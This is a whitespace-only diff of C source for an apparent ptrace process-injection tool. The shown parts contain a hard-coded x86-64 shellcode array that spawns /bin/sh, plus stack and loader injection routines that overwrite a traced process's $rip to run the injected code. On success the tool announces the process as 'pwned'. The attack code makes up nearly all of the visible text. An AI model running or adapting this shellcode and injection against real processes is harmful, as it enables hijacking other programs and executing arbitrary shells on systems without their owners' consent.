@@ -12,8 +12,8 @@
 #include <sys/user.h>
 
 char shellcode[] __attribute__((section(".myshellcode,\"awx\",@progbits#"))) = 	"\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48"
-										 										"\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0"
-																				"\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; 
+										"\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0"
+										"\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; 
 
 void print()
 {
@@ -33,8 +33,8 @@ void success(pid_t pid, struct user_regs_struct registers)
 	
 	ptrace(PTRACE_GETREGS, pid, NULL, &registers);
 	
-    printf(" Content of $rip: 0x%.16llx\n", registers.rip);
-    printf(" Content of addr pointed by $rip: 0x%.16lx\n\n", ptrace(PTRACE_PEEKTEXT, pid, registers.rip, NULL));
+	printf(" Content of $rip: 0x%.16llx\n", registers.rip);
+    	printf(" Content of addr pointed by $rip: 0x%.16lx\n\n", ptrace(PTRACE_PEEKTEXT, pid, registers.rip, NULL));
 	printf("******* Process[%d] pwned! *******\n\n", pid);
 }
 
@@ -76,10 +76,10 @@ void ld_inj(pid_t pid, struct user_regs_struct registers)
 	printf(" Done.\n");
 	printf(" Overwriting tracee's $rip..\n");
         
-    registers.rip = (unsigned long long int) strtoull(wanted, NULL, 16) + 2;
-    ptrace(PTRACE_SETREGS, pid, NULL, &registers);
+    	registers.rip = (unsigned long long int) strtoull(wanted, NULL, 16) + 2;
+    	ptrace(PTRACE_SETREGS, pid, NULL, &registers);
 
-    success(pid, registers);
+    	success(pid, registers);
 
     
 }
@@ -98,10 +98,10 @@ void stack_inj(pid_t pid, struct user_regs_struct registers)
 	printf(" Done.\n");
 	printf(" Overwriting tracee's $rip with $rsp..\n\n");
         
-    registers.rip = registers.rsp + 2;
-    ptrace(PTRACE_SETREGS, pid, NULL, &registers);
+    	registers.rip = registers.rsp + 2;
+    	ptrace(PTRACE_SETREGS, pid, NULL, &registers);
 
-    success(pid, registers);
+    	success(pid, registers);
 }
 
 void rip_to_env(pid_t pid, char* argv0, struct user_regs_struct registers, char * envVar, char * name)
